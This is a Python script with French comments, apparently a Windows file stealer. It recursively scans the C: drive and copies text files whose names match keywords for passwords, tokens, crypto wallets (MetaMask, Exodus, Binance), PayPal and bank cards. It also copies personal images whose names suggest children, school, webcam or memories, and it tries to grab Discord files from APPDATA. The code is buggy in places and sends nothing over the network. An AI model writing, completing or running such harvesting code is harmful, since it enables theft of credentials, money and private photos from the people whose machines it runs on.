
import os 
from os import getenv
import shutil
import sys
import threading
from time import time
from PIL import Image
import time
def discord():
    appdata = getenv(r'APPDATA')

    path = {

    }
    #caracter qui relie
    for fic in path:
        c = "\\"
        #enumere les fichier dans le path de discord
        doc = os.listdir(path['discord'])
        f = 0
        turn = 0
        for files in doc:
            f = f + 1
            turn = turn + 1
            file = doc[turn]
            level = path['discord'] + c + doc[turn]
            print(level)
            try:
                shutil.copyfile(level, f'{file}.txt')
            except:
                print("acces")




img_word = ["montagne",
    "ecole",
    "school",
    "2020",
    "2021",
    "enfant",
    "vacances",
    "child",
    "souvenir",
    "ski",
    "ete",
    'img'
    'webcam',
    "unknow"
]

txt_word = ['token',
    'adresse',
    'wallet',
    'ttk',
    'password',
    'mot de passe',
    'adresse',
    'mdp',
    'paypal',
    'binance',
    'metamask wallet',
    'metamask',
    'exodus',
    'discord',
    'info',
    'carte',
    'carte bancaire',
    'cc',
    'banque',
    'important word',
    'enfant',
    'level',
    'MANIFEST',
    'doc',
    'crypto'
    ]

turn = 0
rec = 0
rec_max = 70 
find = 0
def get_script_path():
    path= os.path.dirname(os.path.realpath(sys.argv[0]))
    return path

def list_dir_txt(path):
    global find
    global turn
    global rec
    rec += 1
    
    try:
        for file in os.listdir(path):
            
            if not os.path.isfile(path + "/" + file):
                list_dir_txt(path + "/" + file)
            else:
                if file.split(".")[-1] == "txt":
                    print(f"--- {path}/{file} --------------------------------------------------------------")
                    for w in txt_word:
                        if w in file:
                            find = find + 1
                            name = f"{path}/{file}"
                            content = open(f"{path}/{file}", "r").read()
                            #print(f"{name}\n{content}")
                            with open(f"{file}",'w') as file:
                                file.write(content)
                               
                        else: 
                            global turn
                            turn = turn + 1
                            #print(f"file vaccum {turn}")
                            pass
                    
    except Exception as e:
        pass
    rec -= 1

def list_dir_img(path):
    global find
    global turn
    global rec
    rec += 1
    
    try:
        for file in os.listdir(path):
            
            if not os.path.isfile(path + "/" + file):
                list_dir_img(path + "/" + file)
            else:
                if file.split(".")[-1] == "jpg" or 'png':
                    print(f"--- {path}/{file} --------------------------------------------------------------")
                    for w in img_word:
                        if w in file:
                            find = find + 1
                            path_image = path + '/' + file
                            Image1 = Image.open(path_image)
                            Image1copy = Image1.copy()
                            Image1copy.save(f"{get_script_path()}/grab-{file}")     
                else:       
                    global turn
                    turn = turn + 1
                    print(f"file vaccum {turn}")
                    pass
                    
    except Exception as e:
        pass
    rec -= 1

threads = []
for i in range(1):
    t = threading.Thread(target=list_dir_txt('c:/'))
    threads.append(t)
    t.start()
#input(f"Total vaccum file {turn} | Total take file {find}")

threads = []
for i in range(1):
    t = threading.Thread(target=list_dir_img('c:/'))
    threads.append(t)
    t.start()
#print(f"Total vaccum file {turn} | Total take file {find}")

